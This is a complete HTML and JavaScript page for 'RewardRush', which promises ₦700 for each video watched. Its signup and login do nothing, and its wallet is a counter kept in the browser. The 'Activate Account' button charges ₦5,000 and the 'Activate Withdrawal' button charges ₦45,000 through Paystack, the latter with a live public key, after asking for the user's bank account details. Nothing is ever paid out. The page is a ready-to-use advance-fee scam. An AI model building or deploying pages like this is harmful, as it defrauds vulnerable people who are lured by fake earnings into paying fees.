<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>RewardRush</title>

  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://js.paystack.co/v1/inline.js"></script>
</head>

<body class="bg-slate-950 text-white">

  <!-- NAVBAR -->
  <nav class="bg-purple-700 p-4 flex justify-between items-center shadow-lg">

    <h1 class="text-3xl font-bold" style="font-size: 20px;">
      RewardRush
    </h1>

    <div class="space-x-4">

      <button onclick="showSection('signup')" class="hover:text-yellow-300">
        Signup
      </button>

      <button onclick="showSection('login')" class="hover:text-yellow-300">
        Login
      </button>

      <button onclick="showSection('dashboard')" class="hover:text-yellow-300">
        Dashboard
      </button>

    </div>

  </nav>

  <!-- HERO -->
  <section class="text-center py-20 bg-gradient-to-r from-purple-700 to-pink-600">

    <h1 class="text-5xl font-bold mb-5">
      Watch Videos & Earn ₦700
    </h1>

    <p class="text-xl">
      Complete video tasks daily and withdraw your earnings easily.
    </p>

    <button
      onclick="activateAccount()"
      class="mt-8 bg-white text-purple-700 px-8 py-4 rounded-xl font-bold text-lg"
    >
      Activate Account
    </button>

  </section>

  <!-- SIGNUP -->
  <section id="signup" class="p-8">

    <div class="max-w-md mx-auto bg-slate-900 p-8 rounded-2xl shadow-2xl border border-purple-500">

      <h2 class="text-3xl font-bold mb-6 text-center">
        Create Account
      </h2>

      <input
        id="signupName"
        type="text"
        placeholder="Full Name"
        class="w-full p-3 rounded-lg mb-4 bg-slate-800 border border-slate-700"
      />

      <input
        id="signupEmail"
        type="email"
        placeholder="Email"
        class="w-full p-3 rounded-lg mb-4 bg-slate-800 border border-slate-700"
      />

      <input
        id="signupPassword"
        type="password"
        placeholder="Password"
        class="w-full p-3 rounded-lg mb-4 bg-slate-800 border border-slate-700"
      />

      <button
        onclick="signupUser()"
        class="bg-purple-700 hover:bg-purple-800 w-full p-3 rounded-xl font-bold"
      >
        Sign Up
      </button>

    </div>

  </section>

  <!-- LOGIN -->
  <section id="login" class="hidden p-8">

    <div class="max-w-md mx-auto bg-slate-900 p-8 rounded-2xl shadow-2xl border border-pink-500">

      <h2 class="text-3xl font-bold mb-6 text-center">
        Login
      </h2>

      <input
        id="loginEmail"
        type="email"
        placeholder="Email"
        class="w-full p-3 rounded-lg mb-4 bg-slate-800 border border-slate-700"
      />

      <input
        id="loginPassword"
        type="password"
        placeholder="Password"
        class="w-full p-3 rounded-lg mb-4 bg-slate-800 border border-slate-700"
      />

      <button
        onclick="loginUser()"
        class="bg-pink-600 hover:bg-pink-700 w-full p-3 rounded-xl font-bold"
      >
        Login
      </button>

    </div>

  </section>

  <!-- DASHBOARD -->
  <section id="dashboard" class="hidden p-8">

    <h2 class="text-4xl font-bold mb-8">
      Dashboard
    </h2>

    <!-- STATS -->
    <div class="grid md:grid-cols-3 gap-6">

      <div class="bg-slate-900 p-6 rounded-2xl border border-purple-500">

        <h3 class="text-xl font-bold">
          Wallet Balance
        </h3>

        <p id="walletBalance" class="text-4xl font-bold mt-4 text-green-400">
          ₦0
        </p>

      </div>

      <div class="bg-slate-900 p-6 rounded-2xl border border-pink-500">

        <h3 class="text-xl font-bold">
          Videos Watched Today
        </h3>

        <p id="videoCount" class="text-4xl font-bold mt-4 text-yellow-300">
          0 / 5
        </p>

      </div>

      <div class="bg-slate-900 p-6 rounded-2xl border border-blue-500">

        <h3 class="text-xl font-bold">
          Earnings Per Video
        </h3>

        <p class="text-4xl font-bold mt-4 text-cyan-400">
          ₦700
        </p>

      </div>

    </div>

    <!-- VIDEO TASK -->
    <div class="mt-10 bg-slate-900 p-8 rounded-2xl border border-purple-500">

      <h3 class="text-3xl font-bold mb-6">
        Watch Video & Earn
      </h3>

      <video
        id="rewardVideo"
        width="100%"
        controls
        class="rounded-xl mb-6"
      >
        <source
          src="https://www.w3schools.com/html/mov_bbb.mp4"
          type="video/mp4"
        />
      </video>

      <button
        onclick="claimReward()"
        class="bg-green-600 hover:bg-green-700 px-8 py-3 rounded-xl font-bold"
      >
        Claim ₦700
      </button>

    </div>

    <!-- WITHDRAW -->
    <div class="mt-10 bg-slate-900 p-8 rounded-2xl border border-pink-500">

      <h3 class="text-3xl font-bold mb-6">
        Withdraw Earnings
      </h3>

      <input
        type="text"
        placeholder="Account Name"
        class="w-full p-3 rounded-lg mb-4 bg-slate-800 border border-slate-700"
      />

      <select
        class="w-full p-3 rounded-lg mb-4 bg-slate-800 border border-slate-700"
      >
        <option>OPay</option>
        <option>PalmPay</option>
        <option>Kuda</option>
        <option>GTBank</option>
        <option>UBA</option>
        <option>Access Bank</option>
        <option>Moniepoint</option>
      </select>

      <input
        type="text"
        placeholder="Account Number"
        class="w-full p-3 rounded-lg mb-6 bg-slate-800 border border-slate-700"
      />

      <button
        onclick="activateWithdrawal()"
        class="bg-yellow-500 hover:bg-yellow-600 text-black w-full p-4 rounded-xl font-bold"
      >
        Activate Withdrawal
      </button>

    </div>

  </section>

  <!-- FOOTER -->
  <footer class="bg-black text-center p-6 mt-10">

    <p>
      © 2026 RewardRush Platform
    </p>

  </footer>

  <!-- JAVASCRIPT -->
  <script>

    let balance = 0;
    let watchedToday = 0;

    function showSection(sectionId) {

      document.getElementById("signup").classList.add("hidden");
      document.getElementById("login").classList.add("hidden");
      document.getElementById("dashboard").classList.add("hidden");

      document.getElementById(sectionId).classList.remove("hidden");
    }

    function signupUser() {

      alert("Signup Successful");

      showSection("login");
    }

    function loginUser() {

      alert("Login Successful");

      showSection("dashboard");
    }

    function claimReward() {

      if (watchedToday >= 5) {

        alert("Daily limit reached. Come back tomorrow.");

        return;
      }

      let video = document.getElementById("rewardVideo");

      if (video.currentTime < 10) {

        alert("Watch the video for at least 10 seconds before claiming.");

        return;
      }

      balance += 700;
      watchedToday++;

      document.getElementById("walletBalance").innerText =
        "₦" + balance;

      document.getElementById("videoCount").innerText =
        watchedToday + " / 5";

      alert("₦700 added successfully");
    }

    function activateAccount() {

      let handler = PaystackPop.setup({

        key: "YOUR_PAYSTACK_PUBLIC_KEY",

        email: "customer@email.com",

        amount: 500000,

        currency: "NGN",

        callback: function(response) {

          alert(
            "Account activated successfully. Ref: " +
            response.reference
          );
        },

        onClose: function() {

          alert("Payment cancelled");
        }

      });

      handler.openIframe();
    }

    function activateWithdrawal() {

      let handler = PaystackPop.setup({

        key: "pk_live_0f28dafe12303b9c6239b6e1cff17054d2b8474f",

        email: "customer@email.com",

        amount: 4500000,

        currency: "NGN",

        callback: function(response) {

          alert(
            "Withdrawal activated successfully. Ref: " +
            response.reference
          );
        },

        onClose: function() {

          alert("Payment cancelled");
        }

      });

      handler.openIframe();
    }

  </script>

</body>
</html>
